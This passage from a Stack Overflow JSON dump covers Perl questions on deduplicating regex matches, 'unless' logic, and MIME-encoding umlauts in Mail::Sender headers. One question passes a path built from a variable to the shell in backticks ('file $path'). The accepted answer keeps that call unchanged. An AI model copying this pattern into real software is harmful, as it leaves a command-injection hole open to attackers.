"user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 5, "last_activity_date": 1462553117, "creation_date": 1462553117, "answer_id": 37077537, "question_id": 37077266, "link": "https://stackoverflow.com/questions/37077266/what-is-the-best-way-to-create-a-unique-array-of-values-from-a-string/37077537#37077537", "title": "What is the best way to create a unique array of values from a string?", "body": "<p>Without modules:</p>\n\n<pre><code>sub uniq { my %seen; grep !$seen{$_}++, @_ }\n</code></pre>\n\n<p>With a commonly-used module:</p>\n\n<pre><code>use List::MoreUtils qw( uniq );\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>my $str = \"bob-2-4 asdfasdfasdf bob-2-4 asdfasdf bob-3-1\";\nmy @unique = uniq $str =~ m/(bob-\\d-\\d)/g;\nsay for @unique;\n</code></pre>\n"}], "owner": {"reputation": 1075, "user_id": 740521, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/e724ef960b60005ddfdf845d82e358de?s=128&d=identicon&r=PG", "display_name": "user740521", "link": "https://stackoverflow.com/users/740521/user740521"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 133, "favorite_count": 0, "accepted_answer_id": 37077349, "answer_count": 2, "score": 0, "last_activity_date": 1462553117, "creation_date": 1462552113, "question_id": 37077266, "link": "https://stackoverflow.com/questions/37077266/what-is-the-best-way-to-create-a-unique-array-of-values-from-a-string", "title": "What is the best way to create a unique array of values from a string?", "body": "<p>Is there a nice one liner in perl that lets you create an array of unique values from a string?</p>\n\n<pre><code>$str = \"bob-2-4 asdfasdfasdf bob-2-4 asdfasdf bob-3-1\";\nmy @unique = $str =~ m/(bob-\\d-\\d)/g;\n# array is now \"bob-2-4, bob-2-4, bob-3-1\"\n</code></pre>\n\n<p>I want the unique array to only contain \"bob-2-4, bob-3-1\" however.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1462551688, "post_id": 37076633, "comment_id": 61698890, "body": "<a href=\"http://perldoc.perl.org/perlsyn.html\" rel=\"nofollow noreferrer\">perldoc perlsyn</a>"}], "answers": [{"tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": false, "score": 1, "last_activity_date": 1462550172, "creation_date": 1462550172, "answer_id": 37076694, "question_id": 37076633, "link": "https://stackoverflow.com/questions/37076633/if-clause-in-perl/37076694#37076694", "title": "If clause in perl", "body": "<p><code>=~</code> tests the left hand side against <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow\">the regular expression</a> on the right hand side.</p>\n\n<p><code>unless (condition)</code> is equivalent to <code>if (! (condition) )</code></p>\n"}, {"comments": [{"owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "edited": false, "score": 0, "creation_date": 1462885517, "post_id": 37079666, "comment_id": 61817587, "body": "Thanks for the answer."}], "tags": [], "owner": {"reputation": 5334, "user_id": 5830574, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/kCmqs.png?s=128&g=1", "display_name": "PerlDuck", "link": "https://stackoverflow.com/users/5830574/perlduck"}, "is_accepted": true, "score": 0, "last_activity_date": 1462561400, "last_edit_date": 1495542701, "creation_date": 1462561400, "answer_id": 37079666, "question_id": 37076633, "link": "https://stackoverflow.com/questions/37076633/if-clause-in-perl/37079666#37079666", "title": "If clause in perl", "body": "<p>As Quentin already said, <code>=~</code> is a regex test. In your case it tests whether <code>$type</code> <em>contains</em> the phrase <code>JPEG</code>. The slashes <code>/</code> are part of the syntax for regular expressions. See <a href=\"http://perldoc.perl.org/perlretut.html\" rel=\"nofollow noreferrer\">Perl's tutorial</a> for details.</p>\n\n<p>Also, <code>unless</code> is just the opposite of <code>if</code>. Some people use it when they want to express <code>if (not \u2026)</code>. I personally consider this bad practice because it reduces the readability, especially when the condition is made up of multiple parts and has <code>!</code>'s in it, like <code>unless($a&gt;5 || ($a!=7 &amp;&amp; (!$b)))</code>. It's just a horror to figure out when the condition matches.</p>\n\n<p>So the code</p>\n\n<pre><code>unless ($type =~ /JPEG/i || $type =~ /PNG/i) {\n   print \"The file is not a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>can be rewritten to</p>\n\n<pre><code>if ( ! ($type =~ /JPEG/i || $type =~ /PNG/i) ) {\n   print \"The file is not a valid JPEG or PNG.\";\n} else {\n   print \"The file IS a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>Or just the other way round (code blocks and condition swapped):</p>\n\n<pre><code>if ( $type =~ /JPEG/i || $type =~ /PNG/i ) {\n   print \"The file IS a valid JPEG or PNG.\";\n} else {\n   print \"The file is not a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>This can further be simplified by joining the two conditions, moving them into the regular expression and ORing them there:</p>\n\n<pre><code>if ( $type =~ /(JPEG|PNG)/i ) {\n   print \"The file IS a valid JPEG or PNG.\";\n} else {\n   print \"The file is not a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>The last-but-one snippet translates to <em>\"if ($type contains JPEG) or ($type contains PNG)\"</em> while the last one translates to <em>\"if $type contains (JPEG or PNG)\"</em>. The result is the same but <code>$type</code> and the regex are considered only once, which (in theory) makes it faster.</p>\n\n<p>In your attempt you also refer to <code>JPG</code> (without the <code>E</code>). This can also be expressed in the regular expression, because <code>JPG</code> is just like <code>JPEG</code> but without that <code>E</code>, so the <code>E</code> is optional. Thus:</p>\n\n<pre><code>if ( $type =~ /(JPE?G|PNG)/i ) {\n   print \"The file IS a valid JPEG, JPG, or PNG.\";\n} else {\n   print \"The file is not a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>The <code>?</code> denotes the optionality of the <code>E</code>. Again, see the tutorial.</p>\n\n<hr>\n\n<p>I was just in the mood for answering your question. But for the future please keep in mind that SO is not a tutorial service and please refer to <a href=\"https://stackoverflow.com/questions/how-to-ask\">https://stackoverflow.com/questions/how-to-ask</a> and <a href=\"https://stackoverflow.com/help/mcve\">https://stackoverflow.com/help/mcve</a>, and use your prefered search engine to figure out the basic Perl syntax.</p>\n"}], "owner": {"reputation": 329, "user_id": 5927716, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/70bfdd9b7d85dd80bdc22bee3d1c84d1?s=128&d=identicon&r=PG&f=1", "display_name": "slicks1", "link": "https://stackoverflow.com/users/5927716/slicks1"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 74, "favorite_count": 0, "accepted_answer_id": 37079666, "answer_count": 2, "score": -5, "last_activity_date": 1462561400, "creation_date": 1462550002, "last_edit_date": 1462551007, "question_id": 37076633, "link": "https://stackoverflow.com/questions/37076633/if-clause-in-perl", "title": "If clause in perl", "body": "<p>I have the following code:</p>\n\n<pre><code>$path = \"/srv/www/root/www/data/\".$img1;\nmy $type = `file $path`;\n\nunless ($type =~ /JPEG/i\n || $type =~ /PNG/i) {\n   print \"The file is not a valid JPEG or PNG.\";\n}\n</code></pre>\n\n<p>I'm new to perl. I want to change this to be <code>if(isimagefile) perform this set of code; else perform this set of code</code> </p>\n\n<p>What I dont understand is the logic here. I don't know what <code>=~</code> is and i dont understand the <code>unless</code> logic</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Here is my current logic:</p>\n\n<pre><code>$path = \"/srv/www/root/www/data/\".$img1;\nmy $type = `file $path`;\nif($type =~ /JPEG/i || $type =~ /PNG/i || $type=~ /JPG/i){\n\n}\n</code></pre>\n\n<p>It doesn't seem to be working though.</p>\n"}, {"tags": ["perl", "email"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 1, "creation_date": 1462544446, "post_id": 37074660, "comment_id": 61694114, "body": "Seems like an encoding problem!!!"}, {"owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "edited": false, "score": 1, "creation_date": 1462544635, "post_id": 37074660, "comment_id": 61694247, "body": "See <a href=\"https://metacpan.org/pod/Encode::MIME::Header\" rel=\"nofollow noreferrer\">Encode::MIME::Header</a> or <a href=\"https://metacpan.org/pod/Email::MIME::RFC2047\" rel=\"nofollow noreferrer\">Email::MIME::RFC2047</a>."}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 1, "creation_date": 1462621464, "post_id": 37074660, "comment_id": 61720142, "body": "&quot;Mutated&quot; is a really odd term. You&#39;ll have better luck with Google if you use &quot;accented&quot;; even the German &quot;umlaut&quot; is widely understood in English discussions as well."}], "answers": [{"comments": [{"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "edited": false, "score": 0, "creation_date": 1462608861, "post_id": 37086092, "comment_id": 61716585, "body": "Which locale do you use? (See LANG environment variable) Is it UTF-8 based?) Do you use <code>use utf8;</code> in your scripts?"}, {"owner": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "edited": false, "score": 0, "creation_date": 1462609105, "post_id": 37086092, "comment_id": 61716633, "body": "BTW In &quot;mostly ascii&quot; languages (like German) it makes sence to force <code>MIME-Q</code> encoding - it leaves headers &quot;mostly readable&quot; in raw format."}, {"owner": {"reputation": 135, "user_id": 3189980, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/7c93e3b51b42b64f8f032b25e8e767dd?s=128&d=identicon&r=PG", "display_name": "averlon", "link": "https://stackoverflow.com/users/3189980/averlon"}, "reply_to_user": {"reputation": 9961, "user_id": 2139766, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/b3qcA.png?s=128&g=1", "display_name": "AnFi", "link": "https://stackoverflow.com/users/2139766/anfi"}, "edited": false, "score": 0, "creation_date": 1462727168, "post_id": 37086092, "comment_id": 61747108, "body": "@Andrzej: this is the environment my server runs with:  locale LANG=de_DE.UTF-8 LANGUAGE=de:en LC_CTYPE=de_DE.UTF-8 LC_NUMERIC=&quot;de_DE.UTF-8&quot; LC_TIME=&quot;de_DE.UTF-8&quot; LC_COLLATE=de_DE.UTF-8 LC_MONETARY=&quot;de_DE.UTF-8&quot; LC_MESSAGES=de_DE.UTF-8 LC_PAPER=&quot;de_DE.UTF-8&quot; LC_NAME=&quot;de_DE.UTF-8&quot; LC_ADDRESS=&quot;de_DE.UTF-8&quot; LC_TELEPHONE=&quot;de_DE.UTF-8&quot; LC_MEASUREMENT=&quot;de_DE.UTF-8&quot; LC_IDENTIFICATION=&quot;de_DE.UTF-8&quot; LC_ALL="}], "tags": [], "owner": {"reputation": 135, "user_id": 3189980, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/7c93e3b51b42b64f8f032b25e8e767dd?s=128&d=identicon&r=PG", "display_name": "averlon", "link": "https://stackoverflow.com/users/3189980/averlon"}, "is_accepted": false, "score": -1, "last_activity_date": 1462608358, "creation_date": 1462608358, "answer_id": 37086092, "question_id": 37074660, "link": "https://stackoverflow.com/questions/37074660/how-to-send-perl-mailsender-with-mutated-vowel/37086092#37086092", "title": "How to send Perl Mail::Sender with mutated vowel?", "body": "<p>Me gain!</p>\n\n<p>this is the result which works - don't ask me why!</p>\n\n<pre><code>$av_loc_FROMN = Encode::encode(\"MIME-Header\", Encode::decode_utf8($av_loc_FROMN));\n</code></pre>\n\n<p>Regards</p>\n\n<p>Karl-Heinz</p>\n"}, {"comments": [{"owner": {"reputation": 135, "user_id": 3189980, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/7c93e3b51b42b64f8f032b25e8e767dd?s=128&d=identicon&r=PG", "display_name": "averlon", "link": "https://stackoverflow.com/users/3189980/averlon"}, "edited": false, "score": 0, "creation_date": 1462727317, "post_id": 37088018, "comment_id": 61747151, "body": "the version with MIME-Q worked in general but had a courious effect. The input string was &quot;Grundwasserfr&#252;hwarnsystem Forstinning&quot; and the result was &quot;Grundwasserfr&#252;hwarns&quot; &quot;stem Forstinning&quot; &lt;noreply@example.de&gt; You see - somehow courious. So I dismissed it."}, {"owner": {"reputation": 135, "user_id": 3189980, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/7c93e3b51b42b64f8f032b25e8e767dd?s=128&d=identicon&r=PG", "display_name": "averlon", "link": "https://stackoverflow.com/users/3189980/averlon"}, "edited": false, "score": 0, "creation_date": 1462727420, "post_id": 37088018, "comment_id": 61747170, "body": "I have meanwhile tested several modules. I will give it a try with the one you recommended. Charsets and codes are a difficult are and, I guess, only transparent for specialists. I am not one at all!"}], "tags": [], "owner": {"reputation": 28131, "user_id": 1956010, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/bfdcb4596e9da98cccbf9a0069fdff6c?s=128&d=identicon&r=PG", "display_name": "nwellnhof", "link": "https://stackoverflow.com/users/1956010/nwellnhof"}, "is_accepted": false, "score": 0, "last_activity_date": 1462621701, "last_edit_date": 1462621701, "creation_date": 1462620844, "answer_id": 37088018, "question_id": 37074660, "link": "https://stackoverflow.com/questions/37074660/how-to-send-perl-mailsender-with-mutated-vowel/37088018#37088018", "title": "How to send Perl Mail::Sender with mutated vowel?", "body": "<p>Looking at the solution that works for you, it seems that your input variables are encoded UTF-8 strings. That's why you have to decode them first. This might be a problem in itself, but it's impossible to judge without knowing the rest of your code.</p>\n\n<p>To convert strings encoded as UTF-8 to MIME header encoding, the <a href=\"https://metacpan.org/pod/Encode#from_to\" rel=\"nofollow\"><code>from_to</code> function</a> is a bit simpler than your solution:</p>\n\n<pre><code># Re-encodes $av_loc_FROMN in place.\nEncode::from_to($av_loc_FROMN, \"UTF-8\", \"MIME-Header\");\n</code></pre>\n\n<p>As mentioned by @Andrzej, you should consider the MIME-Q encoding. With MIME-Q, your encoded email headers stay human-readable for the most part. It really shouldn't make any difference whether you use \"MIME-Header\" (effectively \"MIME-B\") or \"MIME-Q\", so I'm puzzled why your attempt</p>\n\n<pre><code>$av_loc_FROMN = Encode::encode(\"MIME-Q\", Encode::decode_utf8($av_loc_FROMN)); # ganz seltsam mit der leerstelle\n</code></pre>\n\n<p>didn't work. Older versions of the <code>Encode</code> distribution had numerous bugs concerning MIME header encoding, though. Maybe you're running into one of them.</p>\n\n<p>If you're really interested in the correctness of your code, I also wouldn't recommend <code>Encode::MIME::Header</code> for mail headers containing RFC 2822 \"mailboxes\" and \"phrases\", like From, To, Cc, Reply-To, etc. That's because this module doesn't touch characters like <code>&lt;</code>, <code>\"</code>, or <code>@</code>, all of which can have a special meaning in this context and should be quoted. In general, <code>Encode::MIME::Header</code> is only safe for Subject headers, or for display names that contain only alphanumeric characters. For robust handling of mailboxes, I recommend <a href=\"https://metacpan.org/pod/Email::MIME::RFC2047\" rel=\"nofollow\"><code>Email::MIME::RFC2047</code></a>. (Disclosure: I'm the author of this distribution.)</p>\n"}], "owner": {"reputation": 135, "user_id": 3189980, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/7c93e3b51b42b64f8f032b25e8e767dd?s=128&d=identicon&r=PG", "display_name": "averlon", "link": "https://stackoverflow.com/users/3189980/averlon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 200, "favorite_count": 0, "closed_date": 1462841699, "answer_count": 2, "score": -1, "last_activity_date": 1463128495, "creation_date": 1462544017, "last_edit_date": 1592644375, "question_id": 37074660, "link": "https://stackoverflow.com/questions/37074660/how-to-send-perl-mailsender-with-mutated-vowel", "closed_reason": "Duplicate", "title": "How to send Perl Mail::Sender with mutated vowel?", "body": "<p>I have created a Perl script using Mail::Sender to send a mail. All fine - in general it works.</p>\n<p>Some small problems.</p>\n<p>The subject and the from name (name not e-mail address) include mutated vowels (German language special characters).</p>\n<p>I have searched for some hints but did not find any.</p>\n<p>Is there anywhere an example how to work with this or can someone please give me a hint how to get this done.</p>\n<h3>edit</h3>\n<p>I have done this:</p>\n<pre><code>ref ($av_tmp_MAIL = new Mail::Sender \n{ \n    from =&gt; &quot;$av_loc_FROME ($av_loc_FROMN)&quot;,\n    replyto =&gt; $av_loc_FROME,\n    to =&gt; @av_loc_TO,\n    cc =&gt; @av_loc_CC,\n    bcc =&gt; @av_loc_BCC,\n  smtp =&gt; 'smtp.av.loc',\n}\n)\n or die &quot;Error($av_tmp_MAIL) : $Mail::Sender::Error\\n&quot;;\n</code></pre>\n<p>When configuring the &quot;from&quot; part in the form &quot;emailaddress (name)&quot; you normally get the return in the mail client to have the senders name place before the senders e-Mail address in the form:</p>\n<p>&quot;name of sender &lt;e-Mail address of sender&gt;&quot; where &quot;&lt;&gt;&quot; are really shown.</p>\n<p>Since my senders name has some mutated vowels (German special characters) &quot;Grundwasserfr\u00fchwarnsystem Forstinning&quot; I need to encode this part.</p>\n<p>I have tried all these variants:</p>\n<pre><code>#$av_loc_FROMN = Encode::encode(&quot;MIME-Q&quot;, Encode::decode_utf8($av_loc_FROMN)); # ganz seltsam mit der leerstelle\n#$av_loc_FROMN = Encode::encode(&quot;MIME-Header&quot;, $av_loc_FROMN); # ganz seltsam mit der leerstelle\n#$av_loc_FROMN = Encode::encode(&quot;MIME-Q&quot;, $av_loc_FROMN); # ganz schlecht\n#$av_loc_FROMN = Encode::encode(&quot;MIME-B&quot;, $av_loc_FROMN); # tut es nicht\n</code></pre>\n<p>But they all do not do the trick.</p>\n<p>To be honest - even when reading the doc, the differences between MIME-Q and MIME-B and MIME-Header are for sure a miracle for me. But I guess, I would need to study first x years to understand.</p>\n<p>When using:</p>\n<pre><code>$av_loc_SUBJECT = Encode::encode(&quot;MIME-Q&quot;, Encode::decode_utf8($av_loc_SUBJECT));\n</code></pre>\n<p>For the SUBJECT of the mail - it works.</p>\n<p>Text is &quot;Funktionstest Grundwasserfr\u00fchwarnsystem Forstinning&quot;.</p>\n<p>But in general, it should work with all kind of text.</p>\n<h3>edit</h3>\n<p>I will try to tell the whole story behind.</p>\n<p>I have a Bash script doing the work. This works fine. But I have some problems in Bash to create a fine e-mail. Working with mailx works but also has some problems with codes. Working with sendmail is not easy from a bash script and also has some concerns with encoding. At least what I experienced.</p>\n<p>My Bash script does some work and the result is written to a file by echo commands. The text of the file then has to be sent out in case of an alarm to some recipients.</p>\n<p>The mail text file seems to be UTF-8-encoded and contains in some words these mutated vowels (Deutsche Umlaute).</p>\n<p>I expected it to be easier with Perl to create a mail with more possibilities to format the e-mail (in HTML probably). So I wanted to create a Perl script to be called from the bash script with some positional parameters as handover like the from, to, cc, bcc, subject and the file where the text is already prepared.</p>\n<p>That's what I am after.</p>\n<p>And now I am figuring for a solution.</p>\n<p>Yes, it is somehow production stuff (as you might imagine from the subject you saw). But it still is a private activity and some area to learn some programming in Perl, where I am a newbie in.</p>\n<h3>edit</h3>\n<p>This is not how it works; Settings of the parameters were the key to success but even some more prerequisites which had to be considered:</p>\n<p>a) The perl script is called by a bash script.\nb) The bash script naturally hands over the parameters (like --fromn). One of these parameters contains already accented vowels.\nc) the bash script hands over the body to the perl script as a file. The perl script expects the file content to be encoded in utf8.</p>\n<p>So far so good. But the major issue was: the bash script itself had to be a utf8-encoded file. Only then the handed over parameters and the body created by &quot;echo&quot;-commands used also utf8 to encode the character strings. !!!!!!!</p>\n<p>Even setting the ENV to the correct language in the bash script did not help.</p>\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse utf8;\nuse warnings qw/ all FATAL /;\nuse Net::Domain qw(hostname hostfqdn hostdomain domainname);\nuse Net::Ping;\nuse Getopt::Long;\nuse autodie; # die if problem reading or writing a file\nuse DateTime;\nuse DateTime::Format::Strptime;\nuse DateTime::TimeZone;\nuse feature qw{say};\n\nuse File::Spec;\nuse File::Basename;\n\nuse Mail::Sender;\n\nuse Log::Logger;\n\n\n\n\n\n\n#  _      __        _       _     _      \n#   \\    / /       (_)     | |   | |     \n#  \\ \\  / /_ _ _ __ _  __ _| |__ | | ___ \n#   \\ \\/ / _` | '__| |/ _` | '_ \\| |/ _ \\\n#    \\  / (_| | |  | | (_| | |_) | |  __/\n#     \\/ \\__,_|_|  |_|\\__,_|_.__/|_|\\___|\n#                                        \n#                                        \n### variables block\nour $av_std_ARG=1;\nour $av_std_BASE='';\nour $av_std_BIN='/usr/local/share/averlon';\nour $av_std_DEBUG=0;\nour $av_std_DIRNAME=dirname(__FILE__); # gibt dann u.U. nur &quot;.&quot; wieder\nour $av_std_EXIT=0;\nour $av_std_FORCE=0;\nour $av_std_LOGFILE='/var/log/'.hostname().'.log';\nour $av_std_LOGGING=0;\nour $av_std_MESSAGEFILE='/usr/local/share/averlon/av_messages.xml';\nour $av_std_POSPAR;\nour $av_std_RETVAL;\nour $av_std_STORAGE='/ourtmp/';\nour $av_std_USER;\nour $av_std_TEST=0;\nour $av_std_TMP='/tmp/';\nour $av_std_VERBOSE=0;\nour $av_std_VERSION='01.0a';\n\nour $av_loc_FROMN=&quot;&quot;;\nour $av_loc_FROME=&quot;&quot;;\nour $av_loc_TO=&quot;&quot;;\nour @av_loc_TO=();\nour $av_loc_CC=&quot;&quot;;\nour @av_loc_CC=();\nour $av_loc_BCC=&quot;&quot;;\nour @av_loc_BCC=();\nour $av_loc_SUBJECT;\nour $av_loc_FBODY;\nour $av_loc_FATT=&quot;&quot;;\nour @av_loc_FATT=();\n\n###\n### predefined objects\n###\nour $av_tmp_DT=DateTime-&gt;today();\nour $av_tmp_LOGFILE;\nour $av_tmp_TMP;\nour $av_tmp_MAIL;\n\nour $av_tmp_STRING;\nour $av_tmp_FN;\nour $av_tmp_FILE;\n\n#dialogelemente\nmy $av_WINDOW;\nmy $av_BUTTON;\nmy $av_HBOX;\nmy $av_VBOX;\nmy $av_TEXTBOX1;\nmy $av_LABEL1;\n\n#  ______                _   _                 \n#    ____|              | | (_)                \n#   |__ _   _ _ __   ___| |_ _  ___  _ __  ___ \n#    __| | | | '_ \\ / __| __| |/ _ \\| '_ \\/ __|\n#   |  | |_| | | | | (__| |_| | (_) | | | \\__ \\\n#  _|   \\__,_|_| |_|\\___|\\__|_|\\___/|_| |_|___/\n#                                              \n#                                              \n### functions commands block\n\nsub av_help\n{\n    print &quot;Benutzung:\\n&quot;;\n    print &quot;/usr/local/share/averlon/av_sendmail.pl [-d, --debug] [-f, --force] [-h, --help] [-l, --logging] [-t, --test] [-v, --verbose] [-V, --version]\\n&quot;;\n    print &quot;[--fromn=&lt;sender name&gt;] [--frome=&lt;e-mail&gt;] [--to=&lt;e-mail&gt;[,&lt;e-mail&gt;]]\\n&quot;;\n    print &quot;[--cc=&lt;e-mail&gt;[,&lt;e-mail&gt;]] [--bcc=&lt;e-mail&gt;[,&lt;e-mail&gt;]] [--subject=&lt;subject&gt;]\\n&quot;;\n    print &quot;[--fbody=&lt;filename of body&gt;] [--fatt=&lt;filename of attachment&gt;[,&lt;filename of attachment&gt;]]\\n&quot;;\n    print &quot;Bedeutung der Optionen:\\n&quot;;\n    print &quot;  --fromn := Name of sender\\n&quot;;\n    print &quot;  --frome := e-Mail address of sender\\n&quot;;\n    print &quot;  --to := comma separated list of e-mail addresses to send to\\n&quot;;\n    print &quot;  --cc := comma separated list of e-mail addresses for carbon copy\\n&quot;;\n    print &quot;  --bcc := comma separated list of e-mail addresses for blind copy\\n&quot;;\n    print &quot;  --subject := subject to show in mail\\n&quot;;\n    print &quot;  --fbody := file which contains body text\\n&quot;;\n    print &quot;  --fatt := list of filenames which to attach to e-Mail\\n&quot;;\n    print &quot;  -d, --debug := debugging mode\\n&quot;;\n    print &quot;  -f, --force := force running\\n&quot;;\n    print &quot;\\tforce will omit to check dates or other conditions\\n&quot;;\n    print &quot;  -h, --help := diese Information\\n&quot;;\n    print &quot;  -l, --logging := log all output to file in /var/userlog/\\n&quot;;\n    print &quot;\\tfile is stored in /var/userlog and will have job_ as prefix and .log as suffix\\n&quot;;\n    print &quot;  -t, --test := test mode on\\n&quot;;\n    print &quot;  -v, --verbose := verbose logging\\n&quot;;\n    print &quot;  -V, --version := Version wird ausgegeben\\n&quot;;\n}\n\n###\n### routine f\u00fcr das logging\n###\nsub av_logit\n{\n    $av_tmp_STRING=DateTime-&gt;now(time_zone=&gt;'Europe/Berlin')-&gt;strftime('%b')\n    .&quot; &quot;.\n    DateTime-&gt;now(time_zone=&gt;'Europe/Berlin')-&gt;strftime('%d')\n    .&quot; &quot;.\n    DateTime-&gt;now(time_zone=&gt;'Europe/Berlin')-&gt;strftime('%H:%M:%S')\n    .&quot; &quot;.hostname()\n    .&quot; &quot;;\n    $av_tmp_LOGFILE-&gt;log(&quot;$av_tmp_STRING&quot;.&quot;@_&quot;);\n}\n#  _____                                _   _             \n#    __ \\                              | | (_)            \n#   |__) | __ ___ _ __   __ _ _ __ __ _| |_ _  ___  _ __  \n#    ___/ '__/ _ \\ '_ \\ / _` | '__/ _` | __| |/ _ \\| '_ \\ \n#   |   | | |  __/ |_) | (_| | | | (_| | |_| | (_) | | | |\n#  _|   |_|  \\___| .__/ \\__,_|_|  \\__,_|\\__|_|\\___/|_| |_|\n#                | |                                      \n#                |_|                                      \n### preparation commands block\n\nGetOptions (\n&quot;fromn=s&quot; =&gt; \\$av_loc_FROMN,\n&quot;frome=s&quot; =&gt; \\$av_loc_FROME,\n&quot;to=s&quot; =&gt; \\$av_loc_TO,\n&quot;cc=s&quot; =&gt; \\$av_loc_CC,\n&quot;bcc=s&quot; =&gt; \\$av_loc_BCC,\n&quot;subject=s&quot; =&gt; \\$av_loc_SUBJECT,\n&quot;fbody=s&quot; =&gt; \\$av_loc_FBODY,\n&quot;fatt=s&quot; =&gt; \\$av_loc_FATT,\n&quot;d&quot; =&gt; \\$av_std_DEBUG,    # debug\n&quot;debug&quot;   =&gt; \\$av_std_DEBUG,      # debug\n&quot;f&quot;   =&gt; \\$av_std_FORCE,      # debug\n&quot;force&quot;   =&gt; \\$av_std_FORCE,      # debug\n&quot;h&quot;   =&gt; \\&amp;av_help,      # help\n&quot;help&quot;   =&gt; \\&amp;av_help,      # help\n&quot;l&quot;   =&gt; \\$av_std_LOGGING,      # logging\n&quot;logging&quot;   =&gt; \\$av_std_LOGGING,      # logging\n&quot;t&quot;   =&gt; \\$av_std_TEST,      # test\n&quot;test&quot;   =&gt; \\$av_std_TEST,      # test\n&quot;v&quot;   =&gt; \\$av_std_VERBOSE,      # verbose\n&quot;verbose&quot;  =&gt; \\$av_std_VERBOSE,   # verbose\n&quot;V&quot;   =&gt; \\$av_std_VERSION,      # version\n&quot;version&quot;  =&gt; sub { say &quot;Version: $av_std_VERSION&quot; }    # version\n)\nor say (&quot;Error in command line arguments: @ARGV&quot;);\n\n###\n### prepare logging\n###\n$av_tmp_LOGFILE=Log::Logger-&gt;new();\n$av_tmp_LOGFILE-&gt;open_append(&quot;$av_std_LOGFILE&quot;);\n&amp;av_logit(&quot;gestartet&quot;);\n\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_std_DEBUG: $av_std_DEBUG&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_std_FORCE: $av_std_FORCE&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_std_LOGGING: $av_std_LOGGING&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_std_TEST: $av_std_TEST&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_std_VERBOSE: $av_std_VERBOSE&quot;;\n\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FROMN: $av_loc_FROMN&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_FROME: $av_loc_FROME&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_TO: $av_loc_TO&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\@av_loc_CC: $av_loc_CC&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_BCC: $av_loc_BCC&quot;;\n$av_std_DEBUG &amp;&amp; say &quot;debug \\$av_loc_SUBJECT: $av_loc_SUBJECT&quot;;\n$av_std_DEBUG &amp;&amp; say 